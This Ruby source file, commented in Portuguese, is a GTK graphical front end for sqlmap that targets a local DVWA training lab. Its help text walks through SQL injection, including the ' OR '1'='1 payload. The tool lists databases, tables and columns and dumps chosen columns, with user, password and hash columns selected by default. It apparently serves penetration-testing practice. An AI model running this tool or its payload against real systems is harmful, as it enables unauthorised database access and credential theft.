#!/usr/bin/env ruby
# -*- coding: utf-8 -*-
#
# SQL_Database.rb - Interface gráfica para sqlmap (Kali Linux)
# Uso autorizado apenas em laboratório/teste próprio (ex.: DVWA local)
#
# Requisitos:
#   sudo apt install ruby-full ruby-dev libgtk-3-dev libglib2.0-dev sqlmap build-essential pkg-config
#   sudo gem install gtk3
#
# Executar:
#   ruby SQLDatabase.rb

require 'glib2'
require 'gtk3'
require 'fileutils'

DIRETORIO_ATUAL = File.dirname(File.expand_path(__FILE__))
PASTA_PADRAO = File.join(DIRETORIO_ATUAL, "resultados_sqlmap")

MAX_LINHAS_PAINEL = 4000 # limita o TextView para não travar com dumps gigantes

TEXTO_AJUDA = <<~AJUDA
  ═══════════════════════════════════════════════════════════
     COMO USAR O SQL Database (passo a passo)
  ═══════════════════════════════════════════════════════════

  PASSO 1 — Verificar o nível de segurança do DVWA
     http://192.168.0.10/dvwa/security.php
     → Deve mostrar: "Security Level is currently: low"

  PASSO 2 — Testar a injeção manualmente (opcional)
     http://192.168.0.10/dvwa/vulnerabilities/sqli/
     → No campo User ID, digite:  ' OR '1'='1

  PASSO 3 — URL completa para o campo "URL"
     http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

  PASSO 4 — Copiar o Cookie do navegador (F12 → Storage → Cookies)

  PASSO 5 — Preencher o campo "Cookie":
     PHPSESSID=SEU_SESS_ID; security=low

  PASSO FINAL — Executar
     1. Clique em "Iniciar (Listar Bancos)"
     2. Duplo clique num banco   → mostra as tabelas
     3. Duplo clique numa tabela → mostra as colunas
     4. Marque as colunas (ex.: user + password)
     5. Clique em "DUMP DAS COLUNAS SELECIONADAS"
     6. Use Voltar / Avançar para navegar

  RESULTADOS: pasta resultados_sqlmap/ ou a pasta escolhida.

  REQUISITOS
     - sqlmap instalado (sqlmap --version)
     - DVWA rodando e logado (cookie válido)
  ═══════════════════════════════════════════════════════════
AJUDA

def novo_botao(texto)
  b = Gtk::Button.new
  b.label = texto
  b
end

def novo_check(texto)
  c = Gtk::CheckButton.new
  c.label = texto
  c
end

class SQLMapGUI
  def initialize
    @processo_pid = nil
    @historico = []
    @pos_hist = -1
    @col_vars = {}
    @colunas_atuais = []
    @db_atual = nil
    @tabela_atual = nil

    # ===== FILA DE EVENTOS =====
    # A thread worker enfileira closures e agenda um GLib::Idle.
    # g_idle_add é thread-safe no GLib (C), e a fila é drenada
    # inteira de uma vez na main thread — sem polling, sem pipe.
    @fila = Queue.new
    @drena_agendado = false
    @mutex = Mutex.new

    criar_janela
  end

  # Enfileira um bloco para rodar na main thread.
  # Agrupa múltiplos agendamentos num único Idle (evita inundação).
  def na_main(&bloco)
    @fila << bloco
    @mutex.synchronize do
      return if @drena_agendado
      @drena_agendado = true
    end
    GLib::Idle.add do
      @mutex.synchronize { @drena_agendado = false }
      drenar_fila
      false # executa uma vez; novos na_main() rearmam
    end
  end

  def drenar_fila
    # processa no máximo o que já está na fila; eventos novos rearmam o Idle
    until @fila.empty?
      begin
        @fila.pop(true).call
      rescue StandardError => e
        STDERR.puts "Erro em evento da fila: #{e.message}"
      end
    end
  end

  def criar_janela
    @window = Gtk::Window.new("SQL Database (Laboratório Autorizado - Kali Linux)")
    @window.set_default_size(1100, 860)
    @window.signal_connect("destroy") do
      parar_processo silencioso: true
      Gtk.main_quit
    end

    vbox_principal = Gtk::Box.new(:vertical, 4)
    vbox_principal.margin = 6
    @window.add(vbox_principal)

    # ===== FRAME ALVO =====
    frame_alvo = Gtk::Frame.new("Alvo")
    vbox_principal.pack_start(frame_alvo, expand: false, fill: true, padding: 2)

    grid_alvo = Gtk::Grid.new
    grid_alvo.column_spacing = 8
    grid_alvo.row_spacing = 4
    grid_alvo.margin = 6
    frame_alvo.add(grid_alvo)

    grid_alvo.attach(Gtk::Label.new("URL:"), 0, 0, 1, 1)
    @entry_url = Gtk::Entry.new
    @entry_url.text = "http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    @entry_url.hexpand = true
    grid_alvo.attach(@entry_url, 1, 0, 3, 1)

    grid_alvo.attach(Gtk::Label.new("Cookie:"), 0, 1, 1, 1)
    @entry_cookie = Gtk::Entry.new
    @entry_cookie.text = "PHPSESSID=SEU_SESS_ID; security=low"
    @entry_cookie.hexpand = true
    grid_alvo.attach(@entry_cookie, 1, 1, 3, 1)

    hbox_opts = Gtk::Box.new(:horizontal, 8)
    hbox_opts.pack_start(Gtk::Label.new("Level:"), expand: false, fill: false, padding: 2)
    @spin_level = Gtk::SpinButton.new(1, 5, 1)
    @spin_level.value = 1
    hbox_opts.pack_start(@spin_level, expand: false, fill: false, padding: 2)

    hbox_opts.pack_start(Gtk::Label.new("Risk:"), expand: false, fill: false, padding: 8)
    @spin_risk = Gtk::SpinButton.new(1, 3, 1)
    @spin_risk.value = 1
    hbox_opts.pack_start(@spin_risk, expand: false, fill: false, padding: 2)

    @check_batch = novo_check("--batch (sem perguntas)")
    @check_batch.active = true
    hbox_opts.pack_start(@check_batch, expand: false, fill: false, padding: 16)

    grid_alvo.attach(hbox_opts, 0, 2, 4, 1)

    # ===== FRAME PASTA =====
    frame_pasta = Gtk::Frame.new("Pasta de saída (onde o sqlmap salva os resultados)")
    vbox_principal.pack_start(frame_pasta, expand: false, fill: true, padding: 2)

    hbox_pasta = Gtk::Box.new(:horizontal, 4)
    hbox_pasta.margin = 4
    frame_pasta.add(hbox_pasta)

    @entry_pasta = Gtk::Entry.new
    @entry_pasta.text = PASTA_PADRAO
    @entry_pasta.hexpand = true
    hbox_pasta.pack_start(@entry_pasta, expand: true, fill: true, padding: 4)

    btn_escolher = novo_botao("Escolher...")
    btn_escolher.signal_connect("clicked") { escolher_pasta }
    hbox_pasta.pack_start(btn_escolher, expand: false, fill: false, padding: 2)

    btn_abrir = novo_botao("Abrir pasta")
    btn_abrir.signal_connect("clicked") { abrir_pasta }
    hbox_pasta.pack_start(btn_abrir, expand: false, fill: false, padding: 2)

    # ===== FRAME NAVEGAÇÃO =====
    frame_nav = Gtk::Frame.new("Navegação")
    vbox_principal.pack_start(frame_nav, expand: false, fill: true, padding: 2)

    hbox_nav = Gtk::Box.new(:horizontal, 4)
    hbox_nav.margin = 4
    frame_nav.add(hbox_nav)

    @btn_voltar = novo_botao("◀ Voltar")
    @btn_voltar.sensitive = false
    @btn_voltar.signal_connect("clicked") { voltar }
    hbox_nav.pack_start(@btn_voltar, expand: false, fill: false, padding: 4)

    @btn_avancar = novo_botao("Avançar ▶")
    @btn_avancar.sensitive = false
    @btn_avancar.signal_connect("clicked") { avancar }
    hbox_nav.pack_start(@btn_avancar, expand: false, fill: false, padding: 4)

    @btn_iniciar = novo_botao("🔍 Iniciar (Listar Bancos)")
    @btn_iniciar.signal_connect("clicked") { iniciar }
    hbox_nav.pack_start(@btn_iniciar, expand: false, fill: false, padding: 8)

    @lbl_local = Gtk::Label.new("Você está em: — (clique em Iniciar)")
    @lbl_local.hexpand = true
    @lbl_local.xalign = 0
    hbox_nav.pack_start(@lbl_local, expand: true, fill: true, padding: 8)

    btn_ajuda_nav = novo_botao("❓ Ajuda")
    btn_ajuda_nav.signal_connect("clicked") { abrir_ajuda }
    hbox_nav.pack_start(btn_ajuda_nav, expand: false, fill: false, padding: 4)

    # ===== PAINEL DIVIDIDO =====
    paned_h = Gtk::Paned.new(:horizontal)
    paned_h.position = 300
    vbox_principal.pack_start(paned_h, expand: true, fill: true, padding: 2)

    # --- TREEVIEW ---
    frame_tree = Gtk::Frame.new("Explorer (duplo clique para entrar)")
    scroll_tree = Gtk::ScrolledWindow.new
    scroll_tree.set_policy(:automatic, :automatic)

    @tree_store = Gtk::TreeStore.new(String, String, String, String, String)
    @tree_view = Gtk::TreeView.new(@tree_store)
    @tree_view.headers_visible = false

    renderer = Gtk::CellRendererText.new
    col = Gtk::TreeViewColumn.new("Item", renderer, text: 0)
    @tree_view.append_column(col)

    @tree_view.signal_connect("row-activated") { |_v, path, _c| on_duplo_clique(path) }

    scroll_tree.add(@tree_view)
    frame_tree.add(scroll_tree)
    paned_h.pack1(frame_tree, resize: true, shrink: false)

    # --- PAINEL DIREITO ---
    paned_v = Gtk::Paned.new(:vertical)
    paned_v.position = 160
    paned_h.pack2(paned_v, resize: true, shrink: false)

    # ===== SELEÇÃO DE COLUNAS =====
    frame_sel = Gtk::Frame.new("Selecionar colunas (marcar/desmarcar)")
    vbox_sel = Gtk::Box.new(:vertical, 2)
    frame_sel.add(vbox_sel)

    hbox_sel_btns = Gtk::Box.new(:horizontal, 4)
    hbox_sel_btns.margin = 4
    vbox_sel.pack_start(hbox_sel_btns, expand: false, fill: false, padding: 2)

    btn_marcar = novo_botao("Marcar todas")
    btn_marcar.signal_connect("clicked") { marcar_todas }
    hbox_sel_btns.pack_start(btn_marcar, expand: false, fill: false, padding: 2)

    btn_desmarcar = novo_botao("Desmarcar todas")
    btn_desmarcar.signal_connect("clicked") { desmarcar_todas }
    hbox_sel_btns.pack_start(btn_desmarcar, expand: false, fill: false, padding: 2)

    btn_inverter = novo_botao("Inverter seleção")
    btn_inverter.signal_connect("clicked") { inverter_selecao }
    hbox_sel_btns.pack_start(btn_inverter, expand: false, fill: false, padding: 2)

    @lbl_contador = Gtk::Label.new("☑ 0 de 0 selecionadas")
    hbox_sel_btns.pack_start(@lbl_contador, expand: false, fill: false, padding: 10)

    @btn_dump_sel = novo_botao("⬇️ DUMP DAS COLUNAS SELECIONADAS")
    @btn_dump_sel.sensitive = false
    @btn_dump_sel.signal_connect("clicked") { dump_selecionadas }
    hbox_sel_btns.pack_start(@btn_dump_sel, expand: false, fill: false, padding: 10)

    @scroll_checks = Gtk::ScrolledWindow.new
    @scroll_checks.set_policy(:automatic, :automatic)
    @scroll_checks.set_size_request(-1, 100)

    @grid_checks = Gtk::Grid.new
    @grid_checks.column_spacing = 8
    @grid_checks.row_spacing = 2
    @scroll_checks.add(@grid_checks)

    vbox_sel.pack_start(@scroll_checks, expand: true, fill: true, padding: 2)
    paned_v.pack1(frame_sel, resize: false, shrink: false)

    # ===== DADOS =====
    frame_dados = Gtk::Frame.new("Dados encontrados no nível atual")
    scroll_dados = Gtk::ScrolledWindow.new
    scroll_dados.set_policy(:automatic, :automatic)

    @txt_dados = Gtk::TextView.new
    @txt_dados.editable = false
    @txt_dados.monospace = true
    @txt_dados.wrap_mode = :none

    buf = @txt_dados.buffer
    buf.create_tag("destaque", foreground: "#0088cc")
    buf.create_tag("secao", foreground: "#cc6600", weight: Pango::Weight::BOLD)

    scroll_dados.add(@txt_dados)
    frame_dados.add(scroll_dados)
    paned_v.pack2(frame_dados, resize: true, shrink: false)

    # ===== LOG =====
    frame_log = Gtk::Frame.new("Saída (Log do sqlmap)")
    frame_log.set_size_request(-1, 150)
    vbox_principal.pack_start(frame_log, expand: false, fill: true, padding: 2)

    scroll_log = Gtk::ScrolledWindow.new
    scroll_log.set_policy(:automatic, :automatic)

    @txt_log = Gtk::TextView.new
    @txt_log.editable = false
    @txt_log.monospace = true
    @txt_log.wrap_mode = :none

    scroll_log.add(@txt_log)
    frame_log.add(scroll_log)

    # ===== AÇÕES =====
    hbox_acoes = Gtk::Box.new(:horizontal, 4)
    hbox_acoes.margin = 4
    vbox_principal.pack_start(hbox_acoes, expand: false, fill: false, padding: 2)

    btn_salvar = novo_botao("💾 Salvar Dados .TXT")
    btn_salvar.signal_connect("clicked") { salvar_txt }
    hbox_acoes.pack_start(btn_salvar, expand: false, fill: false, padding: 4)

    btn_ajuda2 = novo_botao("❓ Ajuda")
    btn_ajuda2.signal_connect("clicked") { abrir_ajuda }
    hbox_acoes.pack_start(btn_ajuda2, expand: false, fill: false, padding: 4)

    btn_limpar = novo_botao("Limpar Log")
    btn_limpar.signal_connect("clicked") { @txt_log.buffer.text = "" }
    hbox_acoes.pack_end(btn_limpar, expand: false, fill: false, padding: 4)

    btn_parar = novo_botao("Parar sqlmap")
    btn_parar.signal_connect("clicked") { parar }
    hbox_acoes.pack_end(btn_parar, expand: false, fill: false, padding: 4)

    @window.show_all
  end

  # ==================== AJUDA ====================
  def abrir_ajuda
    dialog = Gtk::Dialog.new(
      title: "❓ Ajuda - Como usar o SQL Database",
      parent: @window,
      flags: [:modal, :destroy_with_parent]
    )
    dialog.set_default_size(640, 560)

    content = dialog.content_area

    hbox_btns = Gtk::Box.new(:horizontal, 4)
    hbox_btns.margin = 4

    btn_salvar_ajuda = novo_botao("💾 Salvar ajuda em .TXT")
    btn_salvar_ajuda.signal_connect("clicked") { salvar_ajuda }
    hbox_btns.pack_start(btn_salvar_ajuda, expand: false, fill: false, padding: 4)

    btn_fechar = novo_botao("Fechar")
    btn_fechar.signal_connect("clicked") { dialog.destroy }
    hbox_btns.pack_end(btn_fechar, expand: false, fill: false, padding: 4)

    content.pack_start(hbox_btns, expand: false, fill: false, padding: 2)

    scroll = Gtk::ScrolledWindow.new
    scroll.set_policy(:automatic, :automatic)

    txt = Gtk::TextView.new
    txt.editable = false
    txt.monospace = true
    txt.buffer.text = TEXTO_AJUDA

    scroll.add(txt)
    content.pack_start(scroll, expand: true, fill: true, padding: 4)

    dialog.show_all
  end

  def salvar_ajuda
    dialog = Gtk::FileChooserDialog.new(
      title: "Salvar ajuda",
      parent: @window,
      action: :save,
      buttons: [["Cancelar", :cancel], ["Salvar", :accept]]
    )
    dialog.current_name = "ajuda_sql_database.txt"

    if dialog.run == :accept
      File.write(dialog.filename, TEXTO_AJUDA, encoding: "utf-8")
      log("[✓] Ajuda salva em: #{dialog.filename}\n")
    end
    dialog.destroy
  end

  # ==================== PASTA ====================
  def escolher_pasta
    dialog = Gtk::FileChooserDialog.new(
      title: "Escolha onde salvar os resultados",
      parent: @window,
      action: :select_folder,
      buttons: [["Cancelar", :cancel], ["Selecionar", :accept]]
    )
    @entry_pasta.text = dialog.filename if dialog.run == :accept
    dialog.destroy
  end

  def abrir_pasta
    pasta = @entry_pasta.text.strip
    return if pasta.empty? || !Dir.exist?(pasta)
    pid = Process.spawn("xdg-open", pasta)
    Process.detach(pid)
  rescue StandardError => e
    log("[!] Não foi possível abrir a pasta: #{e.message}\n")
  end

  def garantir_pasta
    pasta = @entry_pasta.text.strip
    FileUtils.mkdir_p(pasta) unless pasta.empty?
    pasta
  end

  # ==================== CHECKBOXES ====================
  def limpar_checks
    # coleta os filhos ANTES de remover (não remover durante iteração)
    @grid_checks.children.each { |child| @grid_checks.remove(child) }
    @col_vars = {}
    @colunas_atuais = []
    @btn_dump_sel.sensitive = false
    atualizar_contador
  end

  def criar_checks(colunas)
    limpar_checks
    padrao_marcadas = %w[user username usuario password senha pass hash email]

    colunas.each_with_index do |col, i|
      nome = col.split(" ")[0]
      cb = novo_check(col)
      cb.active = padrao_marcadas.include?(nome.downcase)
      cb.signal_connect("toggled") { atualizar_contador }

      @grid_checks.attach(cb, i % 4, i / 4, 1, 1)
      @col_vars[nome] = cb
      @colunas_atuais << nome
    end

    @btn_dump_sel.sensitive = true unless colunas.empty?
    @grid_checks.show_all
    atualizar_contador
  end

  def atualizar_contador
    marcadas = colunas_marcadas.length
    total = @col_vars.length
    @lbl_contador.text = "☑ #{marcadas} de #{total} selecionadas"
  end

  def marcar_todas;     @col_vars.each_value { |cb| cb.active = true };        end
  def desmarcar_todas;  @col_vars.each_value { |cb| cb.active = false };       end
  def inverter_selecao; @col_vars.each_value { |cb| cb.active = !cb.active? }; end

  def colunas_marcadas
    @col_vars.select { |_n, cb| cb.active? }.keys
  end

  def dump_selecionadas
    cols = colunas_marcadas
    if cols.empty?
      mostrar_msg("Aviso", "Nenhuma coluna marcada. Marque ao menos uma.")
      return
    end
    unless @db_atual && @tabela_atual
      mostrar_msg("Aviso", "Entre numa tabela primeiro (duplo clique).")
      return
    end

    @btn_iniciar.sensitive = false
    @btn_dump_sel.sensitive = false
    ir_para({ nivel: "data", db: @db_atual, table: @tabela_atual, dados: [] })
    rodar_sqlmap(
      ["-D", @db_atual, "-T", @tabela_atual, "-C", cols.join(","), "--dump"],
      :cb_dados,
      { db: @db_atual, table: @tabela_atual }
    )
  end

  # ==================== INÍCIO ====================
  def iniciar
    @btn_iniciar.sensitive = false
    ir_para({ nivel: "dbs", db: nil, table: nil, dados: [] })
    rodar_sqlmap(["--dbs"], :cb_dbs, {})
  end

  def reativar_botoes
    na_main do
      @btn_iniciar.sensitive = true
      @btn_dump_sel.sensitive = !@col_vars.empty?
    end
  end

  # ==================== HISTÓRICO ====================
  def ir_para(local)
    @historico = @historico[0..@pos_hist]
    @historico << local
    @pos_hist = @historico.length - 1
    renderizar(local)
    atualizar_botoes_nav
  end

  def voltar
    if @pos_hist > 0
      @pos_hist -= 1
      renderizar(@historico[@pos_hist])
      atualizar_botoes_nav
    end
  end

  def avancar
    if @pos_hist < @historico.length - 1
      @pos_hist += 1
      renderizar(@historico[@pos_hist])
      atualizar_botoes_nav
    end
  end

  def atualizar_botoes_nav
    @btn_voltar.sensitive = @pos_hist > 0
    @btn_avancar.sensitive = @pos_hist < @historico.length - 1
  end

  def nome_local(local)
    case local[:nivel]
    when "dbs"     then "Bancos de dados"
    when "tables"  then "Banco: #{local[:db]} → Tabelas"
    when "columns" then "#{local[:db]}.#{local[:table]} → Colunas (marque e faça dump)"
    when "data"    then "Dados de #{local[:db]}.#{local[:table]}"
    else "—"
    end
  end

  # ==================== RENDER ====================
  def renderizar(local)
    @txt_dados.buffer.text = ""
    @tree_store.clear
    @lbl_local.text = "Você está em: #{nome_local(local)}"
    @db_atual = local[:db]
    @tabela_atual = local[:table]

    limpar_checks unless local[:nivel] == "columns"

    case local[:nivel]
    when "dbs"
      iter = @tree_store.append(nil); iter[0] = "📁 Bancos de dados"
      local[:dados].each do |db|
        c = @tree_store.append(nil)
        c[0] = "🗄️ #{db}"; c[1] = "db"; c[2] = db
      end
      mostrar_secao("BANCOS ENCONTRADOS", local[:dados])

    when "tables"
      db = local[:db]
      p = @tree_store.append(nil); p[0] = "🗄️ #{db}"
      local[:dados].each do |tb|
        c = @tree_store.append(nil)
        c[0] = "    📋 #{tb}"; c[1] = "table"; c[2] = db; c[3] = tb
      end
      mostrar_secao("TABELAS DO BANCO '#{db}'", local[:dados])

    when "columns"
      db = local[:db]; tb = local[:table]
      p = @tree_store.append(nil); p[0] = "🗄️ #{db}"
      t = @tree_store.append(nil); t[0] = "    📋 #{tb}"; t[1] = "table"; t[2] = db; t[3] = tb
      local[:dados].each do |col|
        nome = col.split(" ")[0]
        c = @tree_store.append(nil)
        c[0] = "        ☑ #{col}"; c[1] = "column"; c[2] = db; c[3] = tb; c[4] = nome
      end
      criar_checks(local[:dados])
      mostrar_secao("COLUNAS DE #{db}.#{tb} (marque/desmarque)", local[:dados])

    when "data"
      db = local[:db]; tb = local[:table]
      p = @tree_store.append(nil); p[0] = "🗄️ #{db}"
      t = @tree_store.append(nil); t[0] = "    📋 #{tb}"
      d = @tree_store.append(nil); d[0] = "        ⬇️ [ DADOS ]"

      inserir_tag("  DADOS DE #{db}.#{tb}\n", "secao")
      inserir_tag("#{"=" * 50}\n", nil)
      local[:dados].each { |item| inserir_tag("  #{item}\n", "destaque") }
      inserir_tag("  (nada extraído — verifique o log)\n", nil) if local[:dados].empty?
    end

    @tree_view.expand_all
  end

  def mostrar_secao(titulo, itens)
    inserir_tag("  #{titulo}\n", "secao")
    inserir_tag("#{"=" * 50}\n", nil)
    itens.each { |it| inserir_tag("  • #{it}\n", "destaque") }
    inserir_tag("  (nenhum item — veja o log abaixo)\n", nil) if itens.empty?
  end

  def inserir_tag(texto, tag_nome)
    buf = @txt_dados.buffer
    if tag_nome
      tag = buf.tag_table.lookup(tag_nome)
      buf.insert(buf.end_iter, texto, tags: [tag].compact)
    else
      buf.insert(buf.end_iter, texto)
    end
  end

  # ==================== CLIQUE ====================
  def on_duplo_clique(path)
    iter = @tree_store.get_iter(path)
    return unless iter
    tipo = iter[1]
    return if tipo.nil? || tipo.empty?

    case tipo
    when "db"
      db = iter[2]
      ir_para({ nivel: "tables", db: db, table: nil, dados: [] })
      rodar_sqlmap(["-D", db, "--tables"], :cb_tabelas, { db: db })
    when "table"
      db = iter[2]; tb = iter[3]
      ir_para({ nivel: "columns", db: db, table: tb, dados: [] })
      rodar_sqlmap(["-D", db, "-T", tb, "--columns"], :cb_colunas, { db: db, table: tb })
    when "column"
      db = iter[2]; tb = iter[3]; col = iter[4]
      @btn_iniciar.sensitive = false
      ir_para({ nivel: "data", db: db, table: tb, dados: [] })
      rodar_sqlmap(["-D", db, "-T", tb, "-C", col, "--dump"], :cb_dados, { db: db, table: tb })
    end
  end

  # ==================== SQLMAP ====================
  def montar_base
    cmd = ["sqlmap", "-u", @entry_url.text, "--cookie", @entry_cookie.text]
    cmd << "--batch" if @check_batch.active?
    cmd += ["--threads=4", "--flush-session"]
    cmd += ["--level", @spin_level.value.to_i.to_s, "--risk", @spin_risk.value.to_i.to_s]
    pasta = garantir_pasta
    cmd += ["--output-dir", pasta] unless pasta.empty?
    cmd
  end

  def rodar_sqlmap(extra, callback_sym, ctx)
    sqlmap_path = `which sqlmap 2>/dev/null`.strip
    if sqlmap_path.empty?
      mostrar_msg("Erro", "sqlmap não encontrado. Instale: sudo apt install sqlmap")
      reativar_botoes
      return
    end

    garantir_pasta
    cmd = montar_base + extra
    log("\n[+] Executando: #{cmd.join(' ')}\n")

    Thread.new do
      begin
        saida_completa = []
        buffer_log = []
        ultima_flush = Time.now

        IO.popen(cmd, err: [:child, :out]) do |io|
          @processo_pid = io.pid
          io.each_line do |linha|
            saida_completa << linha
            buffer_log << linha
            # FLUSH EM CHUNKS: agrupa as linhas e manda 1 evento a cada 100ms
            # (1 evento por linha em dumps grandes travava a GUI)
            if buffer_log.size >= 30 || (Time.now - ultima_flush) > 0.1
              chunk = buffer_log.join
              buffer_log = []
              ultima_flush = Time.now
              log_chunk(chunk)
            end
          end
        end
        # descarrega o resto
        log_chunk(buffer_log.join) unless buffer_log.empty?

        exit_code = $?.exitstatus || -1
        log("\n[=] Finalizado (código #{exit_code})\n")
        pasta = @entry_pasta.text.strip
        log("[i] Resultados salvos em: #{pasta}\n") unless pasta.empty?

        if exit_code == 0
          texto = saida_completa.join
          na_main do
            begin
              send(callback_sym, texto, ctx)
            rescue StandardError => e
              log("[!] Erro no callback: #{e.message}\n")
              log("    #{e.backtrace.first(3).join("\n    ")}\n")
            ensure
              reativar_botoes
            end
          end
        else
          reativar_botoes
        end
      rescue StandardError => e
        log("[!] Erro: #{e.message}\n")
        reativar_botoes
      ensure
        @processo_pid = nil
      end
    end
  end

  # ==================== CALLBACKS ====================
  def cb_dbs(texto, _ctx)
    bancos = texto.scan(/\[\*\]\s+(\S+)/).flatten
    bancos = texto.scan(/^\|\s+([\w\-]+)\s+\|/).flatten if bancos.empty?
    bancos = bancos.reject { |b| b.downcase == "database" }
    atualizar_local({ nivel: "dbs", db: nil, table: nil, dados: bancos.uniq.sort })
  end

  def cb_tabelas(texto, ctx)
    tabelas = texto.scan(/^\|\s+([\w$]+)\s+\|/).flatten
    tabelas.reject! { |t| t.casecmp("table").zero? }
    atualizar_local({ nivel: "tables", db: ctx[:db], table: nil, dados: tabelas.uniq.sort })
  end

  def cb_colunas(texto, ctx)
    cols = texto.scan(/^\|\s+([\w$]+)\s+\|\s+([\w()]+)/)
    nomes = cols.reject { |c, _t| %w[column field type].include?(c.downcase) }
                .map { |c, t| "#{c} (#{t})" }
    atualizar_local({ nivel: "columns", db: ctx[:db], table: ctx[:table], dados: nomes })
  end

  def cb_dados(texto, ctx)
    linhas = []
    texto.scan(/^\|\s(.+?)\s\|$/) do |m|
      linha = m[0]
      next if linha.strip.chars.uniq.all? { |c| ["-", "+", " "].include?(c) }

      partes = linha.split("|").map(&:strip)
      next if partes.first && %w[user username password column field id].include?(partes.first.downcase)

      linhas << partes.join(" | ")
    end
    atualizar_local({ nivel: "data", db: ctx[:db], table: ctx[:table], dados: linhas })
  end

  def atualizar_local(novo_local)
    @historico[@pos_hist] = novo_local if @pos_hist >= 0 && @pos_hist < @historico.length
    renderizar(novo_local)
    atualizar_botoes_nav
  end

  # ==================== UTIL ====================
  def salvar_txt
    conteudo = @txt_dados.buffer.text
    if conteudo.strip.empty?
      mostrar_msg("Aviso", "Nada para salvar.")
      return
    end

    dialog = Gtk::FileChooserDialog.new(
      title: "Salvar dados",
      parent: @window,
      action: :save,
      buttons: [["Cancelar", :cancel], ["Salvar", :accept]]
    )
    dialog.current_name = "exploracao.txt"
    pasta = garantir_pasta
    dialog.current_folder = pasta unless pasta.empty?

    if dialog.run == :accept
      File.write(dialog.filename, conteudo, encoding: "utf-8")
      log("[✓] TXT salvo: #{dialog.filename}\n")
    end
    dialog.destroy
  end

  def parar
    parar_processo
  end

  def parar_processo(silencioso: false)
    if @processo_pid
      begin
        Process.kill("TERM", @processo_pid)
        log("[!] Processo interrompido.\n") unless silencioso
      rescue Errno::ESRCH
        log("[!] Processo já finalizado.\n") unless silencioso
      end
      reativar_botoes
    end
  end

  # Log agrupado: insere um chunk inteiro de uma vez e TRUNCA o buffer
  # para não crescer indefinidamente (causa de lentidão/travamento)
  def log_chunk(texto)
    na_main do
      buf = @txt_log.buffer
      buf.insert(buf.end_iter, texto)
      # trunca mantendo só as últimas ~2000 linhas
      if buf.line_count > 2200
        inicio = buf.get_iter_at_line(buf.line_count - 2000)
        buf.delete(buf.start_iter, inicio)
      end
      mark = buf.create_mark(nil, buf.end_iter, false)
      @txt_log.scroll_to_mark(mark, 0, false, 0, 0)
    end
  end

  def log(texto)
    log_chunk(texto)
  end

  def mostrar_msg(titulo, msg)
    dialog = Gtk::MessageDialog.new(
      parent: @window,
      flags: :modal,
      type: :info,
      buttons: :ok,
      message: msg
    )
    dialog.title = titulo
    dialog.run
    dialog.destroy
  end
end

if __FILE__ == $PROGRAM_NAME
  app = SQLMapGUI.new
  Gtk.main
end
